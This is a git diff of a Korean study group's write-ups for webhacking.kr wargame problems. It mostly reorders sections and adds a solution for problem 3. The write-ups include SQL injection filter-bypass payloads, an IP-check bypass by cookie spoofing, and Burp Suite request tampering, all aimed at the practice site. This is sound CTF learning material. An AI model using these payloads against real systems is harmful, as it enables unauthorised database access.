@@ -7,7 +7,7 @@
 - 구성원 : 김지연(소프16), 박지선(소프16), 한나라(정통16), 한영빈(소프16), 송지은(소프15)
 - 모임 시각 : 월요일 오후 6시 ~ 8시
 - 모임 장소 : 스스스 랩실
-- 푼 문제 : 1, 4, 6, 12, 14, 15, 16, 17, 18, 24, 25, 26, 27, 32, 38, 49, 56
+- 푼 문제 : 1, 3, 4, 6, 12, 14, 15, 16, 17, 18, 24, 25, 26, 27, 32, 38, 49, 56
 
 ## 1주차 모임
 - 2016.10.31
@@ -151,65 +151,6 @@ Password is 999780930.7
  - 한영빈 : 16, 14
  - 송지은 : 24, 27
 
-### 24번 문제
-- http://webhacking.kr/challenge/bonus/bonus-4/index.phps 페이지로 들어간다.
-- 소스코드를 분석해보면 REMOTE_ADDR이란 쿠키값에 저장된 값을 ip 변수에 저장한다. ip 값을 127.0.0.1로 만들어줘서 문제를 풀면 된다.
-- 우선 REMOTE_ADDR 쿠키를 생성해주고,
-
-```php
-if($_COOKIE[REMOTE_ADDR])
-{
-$ip=str_replace("12","",$ip);
-$ip=str_replace("7.","",$ip);
-$ip=str_replace("0.","",$ip);
-}
-```
-
-- 이 부분에 걸리지 않도록 값을 조정하여 112277..00..00..1 을 쿠키값으로 저장해준다.
-- 후에 새로고침 해주면 문제가 풀린다.
-
-### 27번 문제
-- http://webhacking.kr/challenge/web/web-12/index.phps 페이지로 들어간다.
-- 필터링 된 문자들을 우회해서 sql 인젝션 해주면 된다.
-- no에 1을 입력했을 때 guest가 나오므로, admin은 0이나 2를 입력해야한다고 추측하여 시도해줬다.
-- 입력창에 0) or no=2 을 넣어주면 필터링이 걸리므로 우회하여 0) or no like 2 -- 로 입력해준다.
-- 문제가 해결된다.
-
-### 16번 문제
-- 문제 화면에서, 개발자 콘솔을 열고 요소 검사 메뉴로 들어간다.
-- `script` 태그에 다음과 같은 Javascript 소스가 있는 것을 볼 수 있다.
-
-```javascript
-
-document.body.innerHTML+="<font color=yellow id=aa style=position:relative;left:0;top:0>*</font>";
-
-function mv(cd)
-{
-kk(star.style.posLeft-50,star.style.posTop-50);
-if(cd==100) star.style.posLeft=star.style.posLeft+50;
-if(cd==97) star.style.posLeft=star.style.posLeft-50;
-if(cd==119) star.style.posTop=star.style.posTop-50;
-if(cd==115) star.style.posTop=star.style.posTop+50;
-if(cd==124) location.href=String.fromCharCode(cd);
-}
-
-
-function kk(x,y)
-{
-rndc=Math.floor(Math.random()*9000000);
-document.body.innerHTML+="<font color=#"+rndc+" id=aa style=position:relative;left:"+x+";top:"+y+" onmouseover=this.innerHTML=''>*</font>";
-}
-```
-
-- `mv()` 함수 내부를 보면, 함수 인자인 `cd` 가 `124` 일때, `124` 로 이동하는 것을 볼 수 있다.
-- 개발자 도구 콘솔 메뉴에서 다음 코드를 실행한다.
-
-```javascript
-mv(124);
-```
-
-- 화면이 변경되면서, 플래그 값이 나오는 것을 볼 수 있다. 이를 webhacking.kr 의 Auth 에 제출하면, 문제가 풀리는 것을 볼 수 있다.
-
 ### 14번 문제
 - 문제 화면에서, 개발자 콘솔을 열고 요소 검사 메뉴로 들어간다.
 - `script` 태그에 다음과 같은 Javascript 소스가 있는 것을 볼 수 있다.
@@ -257,12 +198,72 @@ Password is 260100
 
 - 이제 이를 webhacking.kr 의 Auth 에 제출하면, 문제가 풀리는 것을 볼 수 있다.
 
+### 16번 문제
+- 문제 화면에서, 개발자 콘솔을 열고 요소 검사 메뉴로 들어간다.
+- `script` 태그에 다음과 같은 Javascript 소스가 있는 것을 볼 수 있다.
+
+```javascript
+
+document.body.innerHTML+="<font color=yellow id=aa style=position:relative;left:0;top:0>*</font>";
+
+function mv(cd)
+{
+kk(star.style.posLeft-50,star.style.posTop-50);
+if(cd==100) star.style.posLeft=star.style.posLeft+50;
+if(cd==97) star.style.posLeft=star.style.posLeft-50;
+if(cd==119) star.style.posTop=star.style.posTop-50;
+if(cd==115) star.style.posTop=star.style.posTop+50;
+if(cd==124) location.href=String.fromCharCode(cd);
+}
+
+
+function kk(x,y)
+{
+rndc=Math.floor(Math.random()*9000000);
+document.body.innerHTML+="<font color=#"+rndc+" id=aa style=position:relative;left:"+x+";top:"+y+" onmouseover=this.innerHTML=''>*</font>";
+}
+```
+
+- `mv()` 함수 내부를 보면, 함수 인자인 `cd` 가 `124` 일때, `124` 로 이동하는 것을 볼 수 있다.
+- 개발자 도구 콘솔 메뉴에서 다음 코드를 실행한다.
+
+```javascript
+mv(124);
+```
+
+- 화면이 변경되면서, 플래그 값이 나오는 것을 볼 수 있다. 이를 webhacking.kr 의 Auth 에 제출하면, 문제가 풀리는 것을 볼 수 있다.
+
+
 ### 18번 문제
 1. index.phps를 들어가서 읽어보니 id가 guest라고 되어있는 것을 admin으로 바꾸면 solve될 것 같이 보였다.
 2. 일단 id를 아무거나 때려 넣어 보다가 no=1이라고 되어있길래 1을 넣었더니 hi guest가 떴다.
 3. burp suite를 이용해서 저 페이지를 잡아보았다.
 4. 그리고 저 no=1 부분을 수정했다. (0 or 1 limit1, 1이렇게)
 5. no=0%Aor%0A1%0Alimit%0A1,1 이런식으로 바꾸고 페이지에 반영시키면 clear!
+
+### 24번 문제
+- http://webhacking.kr/challenge/bonus/bonus-4/index.phps 페이지로 들어간다.
+- 소스코드를 분석해보면 REMOTE_ADDR이란 쿠키값에 저장된 값을 ip 변수에 저장한다. ip 값을 127.0.0.1로 만들어줘서 문제를 풀면 된다.
+- 우선 REMOTE_ADDR 쿠키를 생성해주고,
+
+```php
+if($_COOKIE[REMOTE_ADDR])
+{
+$ip=str_replace("12","",$ip);
+$ip=str_replace("7.","",$ip);
+$ip=str_replace("0.","",$ip);
+}
+```
+
+- 이 부분에 걸리지 않도록 값을 조정하여 112277..00..00..1 을 쿠키값으로 저장해준다.
+- 후에 새로고침 해주면 문제가 풀린다.
+
+### 27번 문제
+- http://webhacking.kr/challenge/web/web-12/index.phps 페이지로 들어간다.
+- 필터링 된 문자들을 우회해서 sql 인젝션 해주면 된다.
+- no에 1을 입력했을 때 guest가 나오므로, admin은 0이나 2를 입력해야한다고 추측하여 시도해줬다.
+- 입력창에 0) or no=2 을 넣어주면 필터링이 걸리므로 우회하여 0) or no like 2 -- 로 입력해준다.
+- 문제가 해결된다.
 
 ### 38번 문제
 - 웹 해킹 페이지 38번에 들어가면 login과 admin의 버튼이 등장한다
@@ -378,6 +379,88 @@ setTimeout("answer(0)",10000);
  - 한영빈 : 3
  - 송지은 : 32, 49
 
+
+### 3번 문제
+ - 문제 페이지로 들어가면, 퍼즐이 하나 나오는데, `노노그램` 혹은 `네모네모로직` 이라는 퍼즐 게임이다.
+ - 5 * 5 칸이 준비되어 있고, 각 가로줄이나 세로줄 위쪽이나 왼쪽에 숫자가 배열되어 있다.
+ - 적혀있는 숫자의 수 만큼, 칸을 연속해서 칠해야 하며, 숫자가 둘 이상인 경우 칠해진 칸 사이에 빈칸이 하나 이상 있어야 한다.
+  - 예를 들어 1, 2 이면. 한칸 칠하고 최소 한칸 띄어서 두칸을 연속해서 칠해야 함
+ - 해당 칸을 클릭해 칠하는 방식으로, 퍼즐을 풀면 아래와 같은 모양이 나온다. 그리고 `gogo` 를 눌러 다음 단계로 간다.
+
+ ```
+ ■□■□■
+ □□□□□
+ □■■■□
+ □■□■□
+ ■■■■■
+ ```
+
+ - 일일이 클릭하기 싫다면, 다음을 개발자콘솔의 콘솔 탭에서 실행한 후, `gogo` 를 눌러 다음 단계로 갈 수도 있다
+
+ ```javascript
+ let one = [kk._1, kk._3, kk._5, kk._12, kk._13, kk._14, kk._17, kk._19, kk._21, kk._22, kk._23, kk._24, kk._25]
+ one.forEach((item)=>{item.value=1})
+ ```
+
+ - 이름 입력칸이 나오는데, 아무가나 넣고 클릭하면 아래와 같은 내용이 담긴 페이지가 나타난다.
+
+ ```
+ Puzzle
+
+ name : nnnn
+ answer : 1010100000011100101011111
+ ip : <IP Address>
+ ```
+
+ - `answer` 값이 플래그인가? 하고 `Auth` 에 제출해 볼 수 있으나, 이는 플래그가 아니므로 틀렸다고 나온다.
+ - `burpsuite` 를 이용해서 어떤 값이 전달되는지 알아보자.
+  - `burpsuite` 를 열고, Proxy 탭 으로 간 뒤, Options 탭으로 간다.
+  - Proxy Listener 에 아무 설정도 없다면 하나 추가하자. `Add` 를 누른다.
+  - `Bind to port` 를 `8080` 으로, `Bind to address` 는 `Loopback only` 로 선택한다. 그리고, `OK` 를 누른다.
+  - 추가한 항목의 `Running` 체크박스를 체크 상태로 변경한다.
+  - Proxy -> Intercept  로 간다. `Intercept is off` 를 눌러 `Intercept is on` 이 되도록 만든다.
+  - 사용중인 OS 의 프록시 설정을 변경하여, `burpsuite` 의 프록시 서버를 거치도록 설정한다. 주소는 `127.0.0.1`, 포트는 `8080` 으로 하면 된다.
+ - 이제 다시 페이지로 돌아가서, 아까 입력칸에 나온 페이지에서 아무 값이나 넣고 버튼을 눌러보자. 필자는 `admin` 을 넣었다
+ - 다음과 같은 `HTTP` 헤더와 바디가 `burpsuite` 에서 잡히는 것을 볼 수 있다.
+
+ ```
+ POST /challenge/web/web-03/index.php HTTP/1.1
+ Host: webhacking.kr
+ Content-Length: 41
+ Cache-Control: max-age=0
+ Origin: http://webhacking.kr
+ Upgrade-Insecure-Requests: 1
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 Safari/537.36
+ Content-Type: application/x-www-form-urlencoded
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+ Referer: http://webhacking.kr/challenge/web/web-03/index.php?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111
+ Accept-Encoding: gzip, deflate
+ Accept-Language: ko,en-US;q=0.8,en;q=0.6,zh;q=0.4,zh-CN;q=0.2,zh-TW;q=0.2
+ Cookie: PHPSESSID=660d2c9c6785948e67bf8851ed4eeea6
+ Connection: close
+
+ answer=1010100000011100101011111&id=admin
+ ```
+
+ - `answer=1010100000011100101011111&id=admin` 부분에서 `...111` 과 `&id=admin` 사이에 뭔가를 삽입해서 SQL Injection 을 시도해 보자.
+ - `"`,`'`,`or 1=1`, 등을 조합하여 넣어 시도해 보자.
+
+ | 수정된 값 | 서버로 전송한 결과
+ --- | ---
+ `answer=1010100000011100101011111"&id=admin` | `query error!`
+ `answer=1010100000011100101011111'&id=admin` | `no hack`
+ `answer=1010100000011100101011111" or 1&id=admin` | `no hack`
+ `answer=1010100000011100101011111" or 1=1 &id=admin` | `no hack`
+ `answer=1010100000011100101011111=&id=admin` | `no hack`
+ `answer=1010100000011100101011111 || 1&id=admin` | 플래그가 나옴
+
+ - SQL Injection 에 성공한 경우, 아래과 같은 내용이 나타난다. 그 중 `answer` 값이 플래그 이므로 제출하면 된다.
+ ```
+ name : admin
+ answer : <flag>
+ ip : localhost
+ ```
+
 ### 25번 문제
 - url을 먼저 살펴보면, ?file=hello 라고 되어있다.
 
@@ -406,84 +489,3 @@ setTimeout("answer(0)",10000);
 - 필터링 되는 문자들을 우회하여 id를 admin으로 만드는 값을 lv에 입력해준다.
 - 0 or id=admin 을 필터링을 우회하여 입력
 - 0%0A||%0Aid=0x61646d696e 이런식으로 입력해주면 문제가 풀린다.
-
-### 3번 문제
-- 문제 페이지로 들어가면, 퍼즐이 하나 나오는데, `노노그램` 혹은 `네모네모로직` 이라는 퍼즐 게임이다.
-- 5 * 5 칸이 준비되어 있고, 각 가로줄이나 세로줄 위쪽이나 왼쪽에 숫자가 배열되어 있다.
-- 적혀있는 숫자의 수 만큼, 칸을 연속해서 칠해야 하며, 숫자가 둘 이상인 경우 칠해진 칸 사이에 빈칸이 하나 이상 있어야 한다.
- - 예를 들어 1, 2 이면. 한칸 칠하고 최소 한칸 띄어서 두칸을 연속해서 칠해야 함
-- 해당 칸을 클릭해 칠하는 방식으로, 퍼즐을 풀면 아래와 같은 모양이 나온다. 그리고 `gogo` 를 눌러 다음 단계로 간다.
-
-```
-■□■□■
-□□□□□
-□■■■□
-□■□■□
-■■■■■
-```
-
-- 일일이 클릭하기 싫다면, 다음을 개발자콘솔의 콘솔 탭에서 실행한 후, `gogo` 를 눌러 다음 단계로 갈 수도 있다
-
-```javascript
-let one = [kk._1, kk._3, kk._5, kk._12, kk._13, kk._14, kk._17, kk._19, kk._21, kk._22, kk._23, kk._24, kk._25]
-one.forEach((item)=>{item.value=1})
-```
-
-- 이름 입력칸이 나오는데, 아무가나 넣고 클릭하면 아래와 같은 내용이 담긴 페이지가 나타난다.
-
-```
-Puzzle
-
-name : nnnn
-answer : 1010100000011100101011111
-ip : <IP Address>
-```
-
-- `answer` 값이 플래그인가? 하고 `Auth` 에 제출해 볼 수 있으나, 이는 플래그가 아니므로 틀렸다고 나온다.
-- `burpsuite` 를 이용해서 어떤 값이 전달되는지 알아보자.
- - `burpsuite` 를 열고, Proxy 탭 으로 간 뒤, Options 탭으로 간다.
- - Proxy Listener 에 아무 설정도 없다면 하나 추가하자. `Add` 를 누른다.
- - `Bind to port` 를 `8080` 으로, `Bind to address` 는 `Loopback only` 로 선택한다. 그리고, `OK` 를 누른다.
- - 추가한 항목의 `Running` 체크박스를 체크 상태로 변경한다.
- - Proxy -> Intercept  로 간다. `Intercept is off` 를 눌러 `Intercept is on` 이 되도록 만든다.
- - 사용중인 OS 의 프록시 설정을 변경하여, `burpsuite` 의 프록시 서버를 거치도록 설정한다. 주소는 `127.0.0.1`, 포트는 `8080` 으로 하면 된다.
-- 이제 다시 페이지로 돌아가서, 아까 입력칸에 나온 페이지에서 아무 값이나 넣고 버튼을 눌러보자. 필자는 `admin` 을 넣었다
-- 다음과 같은 `HTTP` 헤더와 바디가 `burpsuite` 에서 잡히는 것을 볼 수 있다.
-
-```
-POST /challenge/web/web-03/index.php HTTP/1.1
-Host: webhacking.kr
-Content-Length: 41
-Cache-Control: max-age=0
-Origin: http://webhacking.kr
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 Safari/537.36
-Content-Type: application/x-www-form-urlencoded
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Referer: http://webhacking.kr/challenge/web/web-03/index.php?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111
-Accept-Encoding: gzip, deflate
-Accept-Language: ko,en-US;q=0.8,en;q=0.6,zh;q=0.4,zh-CN;q=0.2,zh-TW;q=0.2
-Cookie: PHPSESSID=660d2c9c6785948e67bf8851ed4eeea6
-Connection: close
-
-answer=1010100000011100101011111&id=admin
-```
-
-- `answer=1010100000011100101011111&id=admin` 부분에서 `...111` 과 `&id=admin` 사이에 뭔가를 삽입해서 SQL Injection 을 시도해 보자.
-- `"`,`'`,`or 1=1`, 등을 조합하여 넣어 시도해 보자.
-
-| 수정된 값 | 서버로 전송한 결과
---- | ---
-`answer=1010100000011100101011111"&id=admin` | `query error!`
-`answer=1010100000011100101011111'&id=admin` | `no hack`
-`answer=1010100000011100101011111" or 1&id=admin` | `no hack`
-`answer=1010100000011100101011111" or 1=1 &id=admin` | `no hack`
-`answer=1010100000011100101011111=&id=admin` | `no hack`
-`answer=1010100000011100101011111 || 1&id=admin` | 플래그가 나옴
-
-- SQL Injection 에 성공한 경우, 아래과 같은 내용이 나타난다. 그 중 `answer` 값이 플래그 이므로 제출하면 된다.
-```
-name : admin
-answer : <flag>
-ip : localhost
-```
